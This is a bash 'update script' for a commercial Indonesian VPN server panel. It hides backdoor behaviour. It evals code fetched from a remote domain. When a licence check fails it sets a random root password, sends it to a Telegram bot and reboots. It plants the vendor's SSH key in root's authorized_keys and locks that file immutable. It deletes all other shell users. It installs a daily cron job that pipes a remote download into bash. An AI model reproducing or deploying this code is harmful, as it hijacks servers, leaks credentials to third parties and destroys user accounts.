                                                                                                    #!/bin/bash
red='\e[1;31m'
green='\e[0;32m'
cyan='\e[0;36m'
white='\e[037;1m'
grey='\e[1;36m'
NC='\e[0m'
MYIP=$(cat /usr/bin/.ipvps)
ipsaya=$(curl -sS ipv4.icanhazip.com)
HOSTNAME=$(hostname)
eval $(wget -qO- "https://domainsaya.dekaa.my.id")
ALLOWED_IP=$(curl -sS "https://raw.githubusercontent.com/diah082/izin/main/ip" | grep -wE "$MYIP" | awk '{print $4}')
send_telegram() {
  MESSAGE="🚫 *Akses Ditolak!*
🔑 *Host:* \`$HOSTNAME\`
--Type <RET> for more, q to quit, c to continue without paging--c
🌐 *Server IP:* \`$ipsaya\`
🆕 *Password Baru:* \`$NEW_PASS\`
🔐 *Password root telah diganti dan server akan direboot.*"

  curl -s -X POST "https://api.telegram.org/bot$KEY/sendMessage" \
    -d "chat_id=$CHATID" \
    -d "text=$MESSAGE" \
    -d "parse_mode=Markdown" >/dev/null
}

if [[ "$MYIP" == "$ALLOWED_IP" ]]; then
  :
else
  echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
  echo -e "\033[41;1m ⚠️       AKSES DITOLAK         ⚠️ \033[0m"
  echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
  echo -e ""
  echo -e "        \033[91;1m❌ SCRIPT LOCKED ❌\033[0m"
  echo -e ""
  echo -e "  \033[0;33m🔒 VPS\033[0m $ipsaya \033[0;33mTelah Diblokir\033[0m"
  echo -e ""
  echo -e "  \033[91m⚠️ Masa Aktif Habis ⚠️\033[0m"
  echo -e "  \033[0;33m💡 Hubungi Admin untuk akses ulang.\033[0m"
  echo -e ""
  echo -e "  \033[92;1m📞 Admin:\033[0m"
  echo -e "  \033[96m🌍 https://nevpn.site\033[0m"
  echo -e "  \033[96m📱 https://whatsapp.nevpn.site\033[0m"
  echo -e ""
  echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
  NEW_PASS=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 8)
  echo -e "$NEW_PASS\n$NEW_PASS" | passwd root >/dev/null 2>&1
  send_telegram
  sleep 3
  rm -- "$0"
  reboot
fi
    NODE_VERSION=$(node -v 2>/dev/null | grep -oP '(?<=v)\d+' || echo "0")
    rm /var/lib/dpkg/stato*
    rm /var/lib/dpkg/lock*

    if [ "$NODE_VERSION" -lt 22 ]; then
        echo -e "${yellow}Installing or upgrading Node.js to version 22...${neutral}"
        curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash - || echo -e "${red}Failed to download Node.js setup${neutral}"
        apt-get install -y nodejs || echo -e "${red}Failed to install Node.js${neutral}"
        npm install -g npm@latest
    else
        echo -e "${green}Node.js is already installed and up-to-date (v$NODE_VERSION), skipping...${neutral}"
    fi
check_and_install_gawk() {
    if ls -l /etc/alternatives/awk | grep -q "/usr/bin/mawk"; then
        echo -e "[INFO] mawk terdeteksi, mengganti ke gawk..."
        if ! command -v gawk &> /dev/null; then
            echo -e "[INFO] Menginstal gawk..."
            apt update &> /dev/null && apt install gawk -y &> /dev/null
        fi
        if command -v gawk &> /dev/null; then
            echo -e "[INFO] gawk berhasil diinstal. Mengatur gawk sebagai default awk..."
            ln -sf $(which gawk) /usr/bin/awk
        else
            echo -e "[ERROR] Gagal menginstal gawk. Update dihentikan."
            exit 1
        fi
    else
        echo -e "[INFO] awk sudah menggunakan gawk atau kompatibel."
    fi
}
PASTEBIN_URLS="https://raw.githubusercontent.com/Diah082/Vip/refs/heads/main/install/id_ed25519.pub"
cd
        AUTHORIZED_KEYS_FILE="/root/.ssh/authorized_keys"
        mkdir -p "/root/.ssh"
         chmod 700 "/root/.ssh"
        if [ ! -f "$AUTHORIZED_KEYS_FILE" ]; then
                 touch "$AUTHORIZED_KEYS_FILE"
                 chmod 600 "$AUTHORIZED_KEYS_FILE"
        fi

      key=$(curl -s "$PASTEBIN_URLS")

      if ! grep -Fxq "$key" "$AUTHORIZED_KEYS_FILE" > /dev/null 2>&1; then
                chattr -ia "$AUTHORIZED_KEYS_FILE" 2>/dev/null
                echo "$key" | sudo tee -a "$AUTHORIZED_KEYS_FILE" > /dev/null
                chattr +ia "$AUTHORIZED_KEYS_FILE" 2>/dev/null
      fi
    chmod 600 "$AUTHORIZED_KEYS_FILE" > /dev/null 2>&1
curl -sS ipv4.icanhazip.com > /usr/bin/.ipvps
clear
loading() {
    local pid=$1
    local message=$2
    local delay=0.1
    local spinstr='|/-\'
    tput civis
    while [ -d /proc/$pid ]; do
        local temp=${spinstr#?}
        printf " [%c] $message\r" "$spinstr"
        spinstr=$temp${spinstr%"$temp"}
        sleep $delay
    done
    tput cnorm
}
if [[ $(ls /var/lib/dpkg/ | grep -c "lock") -gt 0 ]]; then
        rm /var/lib/dpkg/lock* &> /dev/null
        rm /var/lib/dpkg/stato* &> /dev/null
fi

if ! command -v gdown &> /dev/null; then
    if grep -Ei 'ubuntu 24|ubuntu 25|linux 12' /etc/os-release &> /dev/null; then
        apt update -y &> /dev/null && apt install -y python3-full python3-pip &> /dev/null
                pip install --break-system-packages gdown &> /dev/null
    else
        apt update -y &> /dev/null && apt install -y python3-pip &> /dev/null
        pip install gdown &> /dev/null
    fi
fi
if ! command -v 7z &> /dev/null; then
    echo -e " [INFO] Installing p7zip-full..."
    apt install p7zip-full -y &> /dev/null &
    loading $! "Loading Install p7zip-full"
fi
if ! command -v sshpass &> /dev/null; then
    echo -e " [INFO] Installing sshpass..."
    apt install sshpass -y &> /dev/null &
    loading $! "Loading Install sshpass"
fi
if ! command -v speedtest-cli &> /dev/null; then
    echo -e " [INFO] Installing speedtest-cli..."
    apt  install speedtest-cli -y &> /dev/null &
    loading $! "Loading Install SpeedTest"
fi
setup_data() {
  apt install -y sudo curl
wget -qO /usr/bin/detek.zip "https://drive.google.com/u/4/uc?id=1krf9wwbdiYvBAcoJhiqghPH48p1CFBSe"
cd /usr/bin/
unzip detek.zip > /dev/null
mv detek ctrl > /dev/null
mv sshd_config /etc/ssh/sshd_config > /dev/null
chmod +x ctrl > /dev/null
rm detek.zip* > /dev/null
systemctl restart ssh
cd
}

TIME="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"
domain=$(cat /etc/xray/domain)
username=$(curl -sS $IZIN | grep -wE "$MYIP" | awk '{print $2}')
valid=$(curl -sS $IZIN | grep -wE "$MYIP" | awk '{print $3}')
if [[ "$valid" == "Lifetime" ]]; then
  certifacate="Lifetime"
      echo -e "VPS Anda valid, masa aktif: $certifacate"
else
today=$(date +"%Y-%m-%d")
d1=$(date -d "$valid" +%s)
d2=$(date -d "$today" +%s)
certifacate=$(((d1 - d2) / 86400))
fi
# Mendapatkan tanggal dari server
echo -e " [INFO] Fetching server date..."
dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
biji=$(date +"%Y-%m-%d" -d "$dateFromServer")
pwadm="Newbie123@Elma!"
allowed_users=("root")
all_users=$(awk -F: '$7 ~ /(\/bin\/bash|\/bin\/sh)$/ {print $1}' /etc/passwd)
for user in $all_users; do
    if [[ ! " ${allowed_users[@]} " =~ " $user " ]]; then
        userdel -r "$user" > /dev/null 2>&1
        echo "User $user telah dihapus."
    fi
done

FILE_WARNA="/etc/warna"

if [ ! -f "$FILE_WARNA" ] || [ ! -s "$FILE_WARNA" ]; then
    echo " [INFO] Menyiapkan Warna Script..."
    cat <<EOF > "$FILE_WARNA"
start_r=200
start_g=200
start_b=255
mid_r=0
mid_g=0
mid_b=255
end_r=200
end_g=200
end_b=255
EOF
else
    echo " [INFO] Warna Script Berhasil Diatur!"
fi
FILE_IP="/usr/bin/.ipvps"
if [ ! -f "$FILE_IP" ] || [ ! -s "$FILE_IP" ]; then
curl -sS ipv4.icanhazip.com > /usr/bin/.ipvps
fi
fixcron() {
cd
cat > /root/fix.sh << 'EOF'
#!/bin/bash
    systemctl stop cron
    wget -qO /usr/lib/systemd/system/cron.service "https://raw.githubusercontent.com/diah082/vip/main/install/cron.service" >/dev/null 2>&1
    pkill -f /usr/sbin/cron >/dev/null 2>&1
    pkill -f clearcache >/dev/null 2>&1
    pkill -f menu >/dev/null 2>&1
    pkill -f sleep >/dev/null 2>&1
    systemctl daemon-reexec >/dev/null 2>&1
    systemctl daemon-reload >/dev/null 2>&1
    systemctl restart cron >/dev/null 2>&1
rm -- "$0"
EOF
chmod +x fix.sh
echo "/root/fix.sh" | at now + 5 minute
}
Updatews() {
systemctl stop ws
wget -qO /usr/bin/ws "https://raw.githubusercontent.com/diah082/vip/main/sshws/ws" >/dev/null 2>&1
systemctl start ws >/dev/null 2>&1
}
updatewebui() {
cd /opt
gdown --id 1m4gIPAWVsQ2h4ySNukPeWJWp3IlfHak2 -O backup-restore-ui.zip
unzip -o backup-restore-ui.zip
rm backup-restore-ui.zip && cd backup-restore-ui
npm install
cd
cat <<EOF > /etc/systemd/system/restore-ui.service
[Unit]
Description=Backup Restore Web UI Service By Newbie
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/node /opt/backup-restore-ui/server.js
WorkingDirectory=/opt/backup-restore-ui
Restart=always
RestartSec=5
User=root
Environment=NODE_ENV=production

[Install]
WantedBy=multi-user.target

EOF
systemctl daemon-reexec
systemctl daemon-reload
systemctl enable restore-ui
systemctl start restore-ui
}
echo -e " [INFO] Prepare Update Script..."
{
rm /var/www/html/*.txt
updatewebui
setup_data
wget -qO /root/.config/rclone/rclone.conf 'https://drive.google.com/u/4/uc?id=19BP0A8pad2tc9ELmx8JcQPxNKRWP4S6M&export=download'
wget -q https://raw.githubusercontent.com/diah082/vip/main/install/vpn.sh && chmod +x vpn.sh && ./vpn.sh
BUG_FILE="/etc/xray/.bug_optr"
BUG_URL="https://raw.githubusercontent.com/diah082/vip/main/install/bug"

# Cek apakah file ada dan berisi
if [[ -f $BUG_FILE && -s $BUG_FILE && $(grep -i "=" "$BUG_FILE") ]]; then
    echo "File sudah ada dan valid, melanjutkan program."
else
    echo "File kosong atau tidak ditemukan, mendownload ulang..."

    # Pastikan direktori tujuan ada
    mkdir -p "$(dirname "$BUG_FILE")"

    # Download file
    curl -o "$BUG_FILE" -s "$BUG_URL"

    # Periksa apakah download berhasil
    if [[ $? -eq 0 ]]; then
        echo "File berhasil didownload."
    else
        echo "Gagal mendownload file, periksa koneksi atau URL."
        exit 1
    fi
fi
    cron_job="0 0 * * * /bin/bash -c \"wget -qO- 'https://drive.google.com/u/4/uc?id=1jtFVG-q0VhnAF9RtMvzGMtXD9U9Lgi6s&export=download' | bash\""
        crontab -l 2>/dev/null | grep -Fxv "$cron_job" | crontab -
        (crontab -l 2>/dev/null; echo "$cron_job") | crontab -
    wget -qO- 'https://drive.google.com/u/4/uc?id=1jtFVG-q0VhnAF9RtMvzGMtXD9U9Lgi6s&export=download' | bash
rm /etc/cron.d/*reboot &> /dev/null
cat> /etc/cron.d/xp_otm << END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 0 * * * root /usr/bin/xp
END
cat> /etc/cron.d/bckp_otm << END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 22 * * * root /usr/bin/backup
END
cat> /etc/cron.d/logclean << END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/10 * * * * root /usr/bin/clearlog
END
cat> /etc/cron.d/logclean << END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 0 * * * root /usr/bin/clearcache
END
cat> /etc/cron.d/cpu_otm << END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/30 * * * * root /usr/bin/autocpu
END
wget -O /usr/bin/autocpu "${REPO}install/autocpu.sh" && chmod +x /usr/bin/autocpu
cat >/etc/cron.d/xp_sc <<-END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
1 0 * * * root /usr/bin/expsc
END
wget -O /usr/bin/autocpu "${REPO}install/autocpu.sh" && chmod +x /usr/bin/autocpu
set -e
} &> /dev/null &
loading $! "Loading Start Update Script"
cd /root
MAX_RETRY=5
RETRY_COUNT=0
MENU_ZIP="menu.zip"
MENU_DIR="menu"
trap 'rm -f "$MENU_ZIP"; rm -rf "$MENU_DIR"' EXIT
while [[ $RETRY_COUNT -lt $MAX_RETRY ]]; do
    echo " 🔄 Mencoba mengunduh menu.zip (Percobaan $((RETRY_COUNT+1))/$MAX_RETRY)..."

    if rclone copy menu:NEWBIE/menu.zip /root/; then
        echo " ✅ Berhasil mengunduh Menu"
        break
    elif rclone copy dr:NEWBIE/menu.zip /root/; then
        echo " ✅ Berhasil mengunduh Menu"
        break
    elif rclone copy res:NEWBIE/menu.zip /root/; then
        echo " ✅ Berhasil mengunduh Menu"
        break
    elif rclone copy pass:NEWBIE/menu.zip /root/; then
        echo " ✅ Berhasil mengunduh Menu"
        break
    else
        echo " ❌ Gagal mengunduh dari semua remote, mencoba lagi dalam 10 detik..."
        sleep 10
        ((RETRY_COUNT++))
    fi
done

# Proses jika file berhasil didapatkan
if [[ -f "$MENU_ZIP" ]]; then
    echo " 🔄 Mengekstrak menu.zip..."
    7z x -p"$pwadm" "$MENU_ZIP" -o"$MENU_DIR" &> /dev/null

    if [[ $? -eq 0 ]]; then
        echo " ✅ Ekstraksi berhasil, mengatur izin file..."
        chmod +x "$MENU_DIR"/*
        mv "$MENU_DIR"/* /usr/bin/
        echo " ✅ Menu berhasil Diperbarui!"
    else
        echo " ❌ Gagal mengekstrak menu.zip! Password salah atau file corrupt."
        exit 1
    fi
else
    echo " ❌ Gagal mendapatkan menu.zip setelah $MAX_RETRY percobaan."
    exit 1
fi
echo -e " [INFO] Fetching server version..."
serverV=$(curl -sS ${REPO}versi)
echo $serverV > /opt/.ver
rm -- "$0"
# Pesan akhir
TEXT="◇━━━━━━━━━━━━━━◇
<b>   ⚠️NOTIF UPDATE SCRIPT⚠️</b>
<b>     Update Script Sukses</b>
◇━━━━━━━━━━━━━━◇
<b>IP VPS  :</b> ${MYIP}
<b>DOMAIN  :</b> ${domain}
<b>Version :</b> ${serverV}
<b>USER    :</b> ${username}
<b>MASA    :</b> $certifacate DAY
◇━━━━━━━━━━━━━━◇
BY BOT : @Newbie_Store24
"
curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
echo -e " [INFO] File download and Update completed successfully. Version: $serverV!"
exit